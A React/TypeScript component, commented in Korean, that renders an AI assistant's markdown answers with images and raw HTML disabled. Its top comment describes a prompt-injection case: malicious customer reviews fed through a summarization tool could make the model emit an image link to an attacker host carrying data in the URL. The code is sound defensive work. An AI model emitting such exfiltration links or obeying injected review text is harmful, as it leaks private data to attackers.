import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';

/**
 * 어시스턴트 답변(마크다운) 렌더링. LLM 출력은 **외부 입력**으로 다룬다.
 *
 * - HTML 문자열로 꽂지 않는다: react-markdown 은 React 요소를 만들고, 원시 HTML 은 버린다(`skipHtml`).
 * - **이미지는 렌더링하지 않는다.** 리뷰·문의 본문(구매자가 쓴 글)이 요약 도구를 거쳐 모델에 들어가므로,
 *   악의적인 글이 모델에게 `![](https://공격자/?d=…)` 를 쓰게 하면 관리자 브라우저가 그리는 순간 그 주소로 요청이 나간다
 *   (CSP 가 https 이미지를 허용해 막아 주지 않는다). → `img` 는 대체 텍스트만 글자로 보여 준다.
 * - 링크는 새 탭 + `noopener noreferrer`. `javascript:` 등 위험한 주소는 react-markdown 기본 변환이 지우고, 그 경우 글자만 남긴다.
 */
const components: Components = {
  img: ({ alt }) => (alt ? <span className="text-slate-600">[이미지: {alt}]</span> : null),
  // 위험한 주소(javascript: 등)는 기본 변환이 빈 문자열로 만든다 → 그때는 링크가 아니라 글자만 남긴다
  a: ({ href, children }) =>
    href ? (
      <a href={href} target="_blank" rel="noopener noreferrer" className="text-blue-700 underline break-all">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
  // GFM 체크리스트(- [x])의 체크박스 — 조작할 수 없는 입력 요소 대신 이름 있는 기호로
  input: ({ checked }) => (
    <span role="img" aria-label={checked ? '완료' : '미완료'} className="mr-1">
      {checked ? '☑' : '☐'}
    </span>
  ),
  p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0">{children}</p>,
  ul: ({ children }) => <ul className="my-2 pl-5 list-disc first:mt-0 last:mb-0">{children}</ul>,
  ol: ({ children }) => <ol className="my-2 pl-5 list-decimal first:mt-0 last:mb-0">{children}</ol>,
  // 체크리스트 항목(remark-gfm 이 task-list-item 클래스를 붙인다)은 글머리 점 없이 기호만
  li: ({ children, className }) => (
    <li className={className?.includes('task-list-item') ? 'my-0.5 -ml-5 list-none' : 'my-0.5'}>{children}</li>
  ),
  h1: ({ children }) => <h3 className="mt-3 mb-1.5 text-[15px] font-bold first:mt-0">{children}</h3>,
  h2: ({ children }) => <h3 className="mt-3 mb-1.5 text-[15px] font-bold first:mt-0">{children}</h3>,
  h3: ({ children }) => <h4 className="mt-3 mb-1.5 text-sm font-bold first:mt-0">{children}</h4>,
  h4: ({ children }) => <h5 className="mt-2 mb-1 text-sm font-semibold first:mt-0">{children}</h5>,
  blockquote: ({ children }) => (
    <blockquote className="my-2 pl-3 border-l-4 border-slate-300 text-slate-700">{children}</blockquote>
  ),
  hr: () => <hr className="my-3 border-slate-300" />,
  code: ({ children }) => <code className="px-1 py-0.5 rounded bg-slate-200 text-[13px] font-mono">{children}</code>,
  pre: ({ children }) => (
    <pre className="my-2 p-3 rounded-lg bg-slate-800 text-slate-100 text-[13px] overflow-x-auto [&_code]:bg-transparent [&_code]:p-0">
      {children}
    </pre>
  ),
  // 표는 말풍선보다 넓을 수 있다 → 표만 가로 스크롤(말풍선·페이지는 넘치지 않게). 키보드로도 스크롤할 수 있게 tabIndex.
  table: ({ children }) => (
    <div className="my-2 overflow-x-auto first:mt-0 last:mb-0" tabIndex={0} role="group" aria-label="표">
      <table className="border-collapse text-[13px]">{children}</table>
    </div>
  ),
  th: ({ children, style }) => (
    <th style={style} className="border border-slate-300 bg-slate-200 px-2.5 py-1.5 font-semibold whitespace-nowrap">
      {children}
    </th>
  ),
  td: ({ children, style }) => (
    <td style={style} className="border border-slate-300 bg-white px-2.5 py-1.5">
      {children}
    </td>
  ),
};

const remarkPlugins = [remarkGfm];

export default function MarkdownContent({ text }: { text: string }) {
  return (
    <ReactMarkdown remarkPlugins={remarkPlugins} components={components} skipHtml>
      {text}
    </ReactMarkdown>
  );
}
